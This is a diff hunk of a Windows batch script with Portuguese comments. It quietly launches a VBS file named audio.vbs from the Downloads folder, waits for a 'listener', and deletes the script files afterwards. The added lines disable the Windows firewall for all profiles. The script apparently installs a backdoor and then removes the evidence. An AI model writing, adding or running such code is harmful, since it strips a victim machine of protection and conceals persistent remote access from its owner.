@@ -39,6 +39,9 @@ start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
 :: Aguardar um momento para garantir que o listener iniciou
 timeout /t 2 /nobreak >nul
 
+# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
+netsh advfirewall set allprofiles state off
+
 :: Deletar .vbs .bat
 del "%USERPROFILE%\Downloads\audio.vbs"
 del "%USERPROFILE%\Downloads\audio.bat"
